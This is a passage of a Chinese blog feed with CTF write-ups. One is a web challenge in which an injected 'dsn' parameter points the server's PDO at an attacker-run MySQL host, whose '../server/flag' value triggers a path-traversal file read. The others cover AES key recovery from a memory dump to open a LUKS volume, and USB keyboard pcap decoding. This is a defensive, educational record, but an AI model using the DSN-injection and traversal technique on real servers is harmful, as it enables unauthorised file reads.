<p>server/sql.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'func.php'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'dsn'</span>]))&#123;</div><div class="line">    $dsn = $_REQUEST[<span class="string">'dsn'</span>];</div><div class="line">&#125; <span class="keyword">else</span>&#123;</div><div class="line">    $dsn = <span class="string">"wmwcms"</span>;</div><div class="line">&#125;</div><div class="line">$dsn = <span class="string">"mysql:dbname=&#123;$dsn&#125;"</span>;</div><div class="line">$username = <span class="string">'wmwcms'</span>;</div><div class="line">$password = <span class="string">'%glVYKTkLtQ22'</span>;</div><div class="line">$options = <span class="keyword">array</span>(</div><div class="line">    PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'SET names utf8'</span>,</div><div class="line">    );</div><div class="line">$dbh = <span class="keyword">new</span> PDO($dsn, $username, $password, $options);</div></pre></td></tr></table></figure></p>
<p>先配置远程数据库可以访问。修改/etc/mysql/mysql.conf.d/mysqld.cnf。将里面的bind-address = 127.0.0.1注释掉。</p>
<p>接下来配置mysql。这里我用root身份登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">mysql&gt; USE wmwcms;</div><div class="line">Database changed</div><div class="line">mysql&gt; CREATE TABLE `user` (</div><div class="line">    -&gt;   `id` INT AUTO_INCREMENT,</div><div class="line">    -&gt;   `name` VARCHAR(100) NULL,</div><div class="line">    -&gt;   `pwd` VARCHAR(64) NOT NULL,</div><div class="line">    -&gt;   `portrait` VARCHAR(64) DEFAULT &quot;../server/flag&quot;,</div><div class="line">    -&gt;   PRIMARY KEY (`id`),</div><div class="line">    -&gt;   UNIQUE KEY `Duplicate_name` (`name`)</div><div class="line">    -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;</div><div class="line">Query OK, 0 rows affected (0.19 sec)</div><div class="line"></div><div class="line">mysql&gt; INSERT INTO `user` (`name`, `pwd`) values (&quot;test&quot;, &quot;a94a8fe5ccb19ba61c4c0873d391e987982fbbd3&quot;);</div><div class="line">Query OK, 1 row affected (1.06 sec)</div><div class="line"></div><div class="line">mysql&gt; select id,name,pwd,portrait from user;</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">| id | name | pwd                                      | portrait       |</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">|  1 | test | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 | ../server/flag |</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>然后创建wmwcms用户，@后面有个%，表示可以远程登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE USER &apos;wmwcms@%&apos; IDENTIFIED BY &quot;%glVYKTkLtQ22&quot;;</div><div class="line">Query OK, 0 rows affected (2.35 sec)</div></pre></td></tr></table></figure></p>
<p>并为它授权:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; grant all privileges on wmwcms.* to &apos;wmwcms&apos;@&apos;%&apos; identified by &apos;%glVYKTkLtQ22&apos;;</div><div class="line">Query OK, 0 rows affected, 1 warning (0.03 sec)</div></pre></td></tr></table></figure></p>
<p>这样当我们传入的GET参数为<code>dsn=wmwcms;host=yourvps;port=yourport</code>，后端的sql.php中的pdo会去连接你远程的数据库。之后执行img.php时，从中取出的portrait为我们数据库中的portrait字段，这里为<code>../server/flag</code>。继续执行则到了<code>echo file_get_contents($portrait);</code>，也即执行<code>echo file_get_contents(&quot;../server/flag&quot;);</code></p>
<p>为什么数据库中要设置成<code>../server/flag</code>，注意app.php是在public文件的，而且默认的<code>$portrait = &quot;img/user.png&quot;</code>，也表明是在public文件夹下。而从源码中可知，flag在server文件夹下，所以需要返回上一层文件夹才能读取。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170831/2.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ISG&#123;a107063477b1dd64dabbcaeebf636f7b&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ISG2017-wmwcms-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-Cypherpunk’s nightmare-writeup</title>
    <link href="http://yoursite.com/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/"/>
    <id>http://yoursite.com/2017/08/30/Hackit2017-Cypherpunk’s-nightmare-writeup/</id>
    <published>2017-08-30T11:32:22.000Z</published>
    <updated>2017-08-30T12:42:02.448Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-Cypherpunk’s nightmare-writeup<br>LUKS aeskeyfind<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Our officers just have made cold boot attack on the suspect&apos;s computer. Your role is to recover the content of this encrypted hard drive.</div><div class="line">Attachment: (none)</div><div class="line">Webpage: https://mega.nz/#!VdRAkaKT!xP7s74jwnlGmR2spg9RNaKFf5GmCGAv-pxW8aPZNkOw</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了一个压缩包，解压缩后得到三个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">encrypted.dd</div><div class="line">memdump.elf.gz  </div><div class="line">__MACOSX</div></pre></td></tr></table></figure></p>
<p>先看看第一个文件：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/4.png?raw=true" alt=""></p>
<p>可以看到这是一个LUKS加密文件，要解密需要提供密码。结合题目的另外一个文件memdump.elf.gz，我们可以利用工具<code>aeskeyfind</code>来提取藏在内存中的aeskey。</p>
<p>可以通过下面的命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install aeskeyfind</div></pre></td></tr></table></figure></p>
<p>将memdump.elf.gz压缩包解压后得到data文件，运行aeskeyfind：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aeskeyfind -v data</div></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">FOUND POSSIBLE 128-BIT KEY AT BYTE bf16da0</div><div class="line"></div><div class="line">KEY: 9e90126c33c85d9a6913e649301b5dcf</div><div class="line"></div><div class="line">EXTENDED KEY:</div><div class="line">9e90126c33c85d9a6913e649301b5dcf</div><div class="line">30dc98680314c5f26a0723bb5a1c7e74</div><div class="line">ae2f0ad6ad3bcf24c73cec9f9d2092eb</div><div class="line">1d60e388b05b2cac7767c033ea4752d8</div><div class="line">b560820f053baea3725c6e90981b3c48</div><div class="line">0a8bd0490fb07eea7dec107ae5f72c32</div><div class="line">42faf3904d4a8d7a30a69d00d551b132</div><div class="line">d332d0939e785de9aedec0e97b8f71db</div><div class="line">209169b2bee9345b1037f4b26bb88569</div><div class="line">570690cde9efa496f9d850249260d54d</div><div class="line">b105738258ead714a13287303352527d</div><div class="line"></div><div class="line">CONSTRAINTS ON ROWS:</div><div class="line">00000004000000000000000000000000</div><div class="line">000000be000000000000000000000000</div><div class="line">0000005e000000000000000000000000</div><div class="line">00000087000000000000000000000000</div><div class="line">00000046000000000000000000000000</div><div class="line">000000d9000000000000000000000000</div><div class="line">00000003000000000000000000000000</div><div class="line">00000021000000000000000000000000</div><div class="line">0000007f000000000000000000000000</div><div class="line">0000004f000000000000000000000000</div><div class="line"></div><div class="line">FOUND POSSIBLE 128-BIT KEY AT BYTE bf16fa0</div><div class="line"></div><div class="line">KEY: 683c5a4bf8f1cedf5b649c482e48e639</div><div class="line"></div><div class="line">EXTENDED KEY:</div><div class="line">683c5a4bf8f1cedf5b649c482e48e639</div><div class="line">3bb2487ac34386a598271aedb66ffcd4</div><div class="line">9102003452418691ca669c7c7c0960a8</div><div class="line">94d2c224c69344b50cf5d8c970fcb861</div><div class="line">2cbe2d75ea2d69c0e6d8b10996240968</div><div class="line">0abf68e5e0920125064ab02c906eb944</div><div class="line">b5e97385557b72a05331c28cc35f7bc8</div><div class="line">3ac89bab6fb3e90b3c822b87ffdd504f</div><div class="line">7b9b1fbd1428f6b628aadd31d7778d7e</div><div class="line">95c6ecb381ee1a05a944c7347e334a4a</div><div class="line">60103a40e1fe204548bae7713689ad3b</div><div class="line"></div><div class="line">CONSTRAINTS ON ROWS:</div><div class="line">00000031000000000000000000000000</div><div class="line">0000004e000000000000000000000000</div><div class="line">00000010000000000000000000000000</div><div class="line">00000051000000000000000000000000</div><div class="line">00000090000000000000000000000000</div><div class="line">00000060000000000000000000000000</div><div class="line">0000002e000000000000000000000000</div><div class="line">00000016000000000000000000000000</div><div class="line">0000000e000000000000000000000000</div><div class="line">000000f3000000000000000000000000</div><div class="line"></div><div class="line">Keyfind progress: 100%</div></pre></td></tr></table></figure></p>
<p>重点是得到了两个KEY:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">KEY: 9e90126c33c85d9a6913e649301b5dcf</div><div class="line">KEY: 683c5a4bf8f1cedf5b649c482e48e639</div></pre></td></tr></table></figure></p>
<p>先拿一个key试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;9e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.key</div></pre></td></tr></table></figure></p>
<p>尝试解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div></pre></td></tr></table></figure></p>
<p>但是提示出错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">无法从密钥文件 Safe.key 读取 32 字节。</div></pre></td></tr></table></figure></p>
<p>我们看看Safe.key是怎样的；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/5.png?raw=true" alt=""></p>
<p>发现只有十六个字节。</p>
<p>结合有两个key，我们把两个合起来试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/nightmare# echo &quot;9e90126c33c85d9a6913e649301b5dcf683c5a4bf8f1cedf5b649c482e48e639&quot; | xxd -r -p &gt; Safe.key</div><div class="line">root@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div><div class="line">卷密钥与卷不匹配。</div><div class="line">root@chybeta:~/Desktop/nightmare# echo &quot;683c5a4bf8f1cedf5b649c482e48e6399e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.key</div><div class="line">root@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div></pre></td></tr></table></figure></p>
<p>然后在kali系统中可以发现已经可以直接打开卷宗。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/6.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;Not_paranoid_enough&#125;</div></pre></td></tr></table></figure></p>
<p>也可以通过挂载来实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/nightmare# ls -l /dev/mapper/</div><div class="line">总用量 0</div><div class="line">crw------- 1 root root 10, 236 8月  25 05:25 control</div><div class="line">lrwxrwxrwx 1 root root       7 8月  25 05:26 safe-home -&gt; ../dm-0</div><div class="line">root@chybeta:~/Desktop/nightmare# mkdir /mnt/safe-home</div><div class="line">root@chybeta:~/Desktop/nightmare# mount /dev/mapper/safe-home /mnt/safe-home/</div><div class="line">root@chybeta:~/Desktop/nightmare# cd /mnt/safe-home/</div><div class="line">root@chybeta:/mnt/safe-home# ls</div><div class="line">flag.txt  Melkor_ELF_fuzzer</div><div class="line">root@chybeta:/mnt/safe-home# cat flag.txt</div><div class="line">h4ck1t&#123;Not_paranoid_enough&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-Cypherpunk’s nightmare-writeup&lt;br&gt;LUKS aeskeyfind&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="Forensic" scheme="http://yoursite.com/tags/Forensic/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-USB ducker-writeup</title>
    <link href="http://yoursite.com/2017/08/30/Hackit2017-USB-ducker-writeup/"/>
    <id>http://yoursite.com/2017/08/30/Hackit2017-USB-ducker-writeup/</id>
    <published>2017-08-30T11:22:00.000Z</published>
    <updated>2017-08-30T12:41:40.615Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-USB ducker-writeup<br>usb keyboard pcap<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag&#123;...&#125; )</div><div class="line">Attachment: (none)</div><div class="line">Webpage: https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3M</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了pcap文件。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/2.png?raw=true" alt=""></p>
<p>可以知道对应的设备为apple的keyboard。</p>
<p>对于keyborad的数据传输，在数据包的<code>Leftover Capture Data</code>中，根据这篇文章：<a href="http://blog.csdn.net/luohsh1/article/details/8645471" target="_blank" rel="external"> USB鼠标、键盘数据格式 </a> 和 <a href="http://www.microchip.com/forums/m438695.aspx" target="_blank" rel="external">HID Keyboard report descriptor</a>。键盘发送给PC的数据每次8个字节，假设收到的数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">02:00:04:00:00:00:00:00</div></pre></td></tr></table></figure></p>
<p>第一个字节是modifier keys，对应的规则如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">|--bit0:   Left Control是否按下，按下为1  </div><div class="line">|--bit1:   Left Shift  是否按下，按下为1  </div><div class="line">|--bit2:   Left Alt    是否按下，按下为1  </div><div class="line">|--bit3:   Left GUI    是否按下，按下为1  </div><div class="line">|--bit4:   Right Control是否按下，按下为1  </div><div class="line">|--bit5:   Right Shift 是否按下，按下为1  </div><div class="line">|--bit6:   Right Alt   是否按下，按下为1  </div><div class="line">|--bit7:   Right GUI   是否按下，按下为1</div></pre></td></tr></table></figure></p>
<p>一个字节是8位，这里是<code>02</code>，即对应着<code>0000 0010</code>，即可解码为<code>Left Shift</code>，也就是说按下了键盘左边的Shift键。假若数据为<code>00</code>，则表示啥都不做。</p>
<p>第二个字节是padding，默认为<code>00</code>。可略过不提。</p>
<p>第三个字节起到第八个字节为普通按键，解码规则可以根据 <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" target="_blank" rel="external">Universal Serial Bus (USB)</a>中第53页的规则来解码。</p>
<p>比如说我们收到了数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">04:00:00:00:00:00</div></pre></td></tr></table></figure></p>
<p>根据解码规则，以及第一字节shift被按下，可知为大写字母<code>A</code>。</p>
<p>接下去开始针对题目提供的数据包进行分析。<br>根据 <a href="https://www.wireshark.org/docs/dfref/u/usb.html" target="_blank" rel="external">https://www.wireshark.org/docs/dfref/u/usb.html</a> 可以知道 <code>Leftover Capture Data</code> 所对应的Field name为 <code>usb.capdata</code>，我们可以把值为<code>00:00:00:00:00:00:00:00</code>的数据过滤掉，因为它表示啥都不输入。</p>
<p>而我们的目标是keyboard的数据，从pcap包中看它对应的设备Device address为3，所对应的Field name为<code>usb.device_address</code>。</p>
<p>我们可以使用tshark命令提取对应的数据，并将其保存到usbdata.txt中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r task.pcap -Y &quot;usb.capdata != 0 and usb.device_address==3&quot; -T fields -e usb.capdata &gt; usbdata.txt</div></pre></td></tr></table></figure></p>
<p>提取出来的数据差不多这样：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/3.png?raw=true" alt=""><br>(好吧，至于为什么还有00:00:00:00:00:00:00:00，哪位解释下)</p>
<p>由于还有一些零行，可以用下面命令再过滤一遍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat usbdata.txt | grep -v &quot;00:00:00:00:00:00:00:00&quot; &gt; usbdata_filter.txt</div></pre></td></tr></table></figure></p>
<p>然后根据解码规则进行解码。脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">KEYCODE = &#123;</div><div class="line">    <span class="number">0x04</span>:[<span class="string">'a'</span>, <span class="string">'A'</span>],</div><div class="line">    <span class="number">0x05</span>:[<span class="string">'b'</span>, <span class="string">'B'</span>],</div><div class="line">    <span class="number">0x06</span>:[<span class="string">'c'</span>, <span class="string">'C'</span>],</div><div class="line">    <span class="number">0x07</span>:[<span class="string">'d'</span>, <span class="string">'D'</span>],</div><div class="line">    <span class="number">0x08</span>:[<span class="string">'e'</span>, <span class="string">'E'</span>],</div><div class="line">    <span class="number">0x09</span>:[<span class="string">'f'</span>, <span class="string">'F'</span>],</div><div class="line">    <span class="number">0x0A</span>:[<span class="string">'g'</span>, <span class="string">'G'</span>],</div><div class="line">    <span class="number">0x0B</span>:[<span class="string">'h'</span>, <span class="string">'H'</span>],</div><div class="line">    <span class="number">0x0C</span>:[<span class="string">'i'</span>, <span class="string">'I'</span>],</div><div class="line">    <span class="number">0x0D</span>:[<span class="string">'j'</span>, <span class="string">'J'</span>],</div><div class="line">    <span class="number">0x0E</span>:[<span class="string">'k'</span>, <span class="string">'K'</span>],</div><div class="line">    <span class="number">0x0F</span>:[<span class="string">'l'</span>, <span class="string">'L'</span>],</div><div class="line">    <span class="number">0x10</span>:[<span class="string">'m'</span>, <span class="string">'M'</span>],</div><div class="line">    <span class="number">0x11</span>:[<span class="string">'n'</span>, <span class="string">'N'</span>],</div><div class="line">    <span class="number">0x12</span>:[<span class="string">'o'</span>, <span class="string">'O'</span>],</div><div class="line">    <span class="number">0x13</span>:[<span class="string">'p'</span>, <span class="string">'P'</span>],</div><div class="line">    <span class="number">0x14</span>:[<span class="string">'q'</span>, <span class="string">'Q'</span>],</div><div class="line">    <span class="number">0x15</span>:[<span class="string">'r'</span>, <span class="string">'R'</span>],</div><div class="line">    <span class="number">0x16</span>:[<span class="string">'s'</span>, <span class="string">'S'</span>],</div><div class="line">    <span class="number">0x17</span>:[<span class="string">'t'</span>, <span class="string">'T'</span>],</div><div class="line">    <span class="number">0x18</span>:[<span class="string">'u'</span>, <span class="string">'U'</span>],</div><div class="line">    <span class="number">0x19</span>:[<span class="string">'v'</span>, <span class="string">'V'</span>],</div><div class="line">    <span class="number">0x1A</span>:[<span class="string">'w'</span>, <span class="string">'W'</span>],</div><div class="line">    <span class="number">0x1B</span>:[<span class="string">'x'</span>, <span class="string">'X'</span>],</div><div class="line">    <span class="number">0x1C</span>:[<span class="string">'y'</span>, <span class="string">'Y'</span>],</div><div class="line">    <span class="number">0x1D</span>:[<span class="string">'z'</span>, <span class="string">'Z'</span>],</div><div class="line">    <span class="number">0x1E</span>:[<span class="string">'1'</span>, <span class="string">'!'</span>],</div><div class="line">    <span class="number">0x1F</span>:[<span class="string">'2'</span>, <span class="string">'@'</span>],</div><div class="line">    <span class="number">0x20</span>:[<span class="string">'3'</span>, <span class="string">'#'</span>],</div><div class="line">    <span class="number">0x21</span>:[<span class="string">'4'</span>, <span class="string">'$'</span>],</div><div class="line">    <span class="number">0x22</span>:[<span class="string">'5'</span>, <span class="string">'%'</span>],</div><div class="line">    <span class="number">0x23</span>:[<span class="string">'6'</span>, <span class="string">'^'</span>],</div><div class="line">    <span class="number">0x24</span>:[<span class="string">'7'</span>, <span class="string">'&amp;'</span>],</div><div class="line">    <span class="number">0x25</span>:[<span class="string">'8'</span>, <span class="string">'*'</span>],</div><div class="line">    <span class="number">0x26</span>:[<span class="string">'9'</span>, <span class="string">'('</span>],</div><div class="line">    <span class="number">0x27</span>:[<span class="string">'0'</span>, <span class="string">')'</span>],</div><div class="line">    <span class="number">0x28</span>:[<span class="string">'\n'</span>,<span class="string">'\n'</span>],</div><div class="line">    <span class="number">0x2C</span>:[<span class="string">' '</span>, <span class="string">' '</span>],</div><div class="line">    <span class="number">0x2D</span>:[<span class="string">'-'</span>, <span class="string">'_'</span>],</div><div class="line">    <span class="number">0x2E</span>:[<span class="string">'='</span>, <span class="string">'+'</span>],</div><div class="line">    <span class="number">0x2F</span>:[<span class="string">'['</span>, <span class="string">'&#123;'</span>],</div><div class="line">    <span class="number">0x30</span>:[<span class="string">']'</span>, <span class="string">'&#125;'</span>],</div><div class="line">    <span class="number">0x32</span>:[<span class="string">'#'</span>,<span class="string">'~'</span>],</div><div class="line">    <span class="number">0x33</span>:[<span class="string">';'</span>, <span class="string">':'</span>],</div><div class="line">    <span class="number">0x34</span>:[<span class="string">'\''</span>, <span class="string">'"'</span>],</div><div class="line">    <span class="number">0x36</span>:[<span class="string">','</span>, <span class="string">'&lt;'</span>],</div><div class="line">    <span class="number">0x37</span>:[<span class="string">'.'</span>, <span class="string">'&gt;'</span>],</div><div class="line">    <span class="number">0x38</span>:[<span class="string">'/'</span>, <span class="string">'?'</span>],</div><div class="line">    <span class="number">0x2b</span>:[<span class="string">'\t'</span>,<span class="string">'\t'</span>],</div><div class="line">    <span class="number">0x4f</span>:[<span class="string">u'→'</span>,<span class="string">u'→'</span>],</div><div class="line">    <span class="number">0x50</span>:[<span class="string">u'←'</span>,<span class="string">u'←'</span>],</div><div class="line">    <span class="number">0x51</span>:[<span class="string">u'↓'</span>,<span class="string">u'↓'</span>],</div><div class="line">    <span class="number">0x52</span>:[<span class="string">u'↑'</span>,<span class="string">u'↑'</span>]</div><div class="line">&#125;</div><div class="line"></div><div class="line">NA_KEYCODE = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</div><div class="line">file = open(<span class="string">"usbdata_filter.txt"</span>,<span class="string">"rb"</span>)</div><div class="line">result = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    data = file.readline()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    data = data[:<span class="number">-1</span>].split(<span class="string">":"</span>)</div><div class="line">    normalcode = int(data[<span class="number">2</span>],<span class="number">16</span>)</div><div class="line">    <span class="keyword">if</span> normalcode  <span class="keyword">in</span> NA_KEYCODE:</div><div class="line">        <span class="keyword">continue</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">'02'</span>:</div><div class="line">        shiftcode = <span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        shiftcode = <span class="number">0</span></div><div class="line">    <span class="comment"># print(normalcode, shiftcode)</span></div><div class="line">    result += KEYCODE[normalcode][shiftcode]</div><div class="line">file.close()</div><div class="line">print(result)</div></pre></td></tr></table></figure></p>
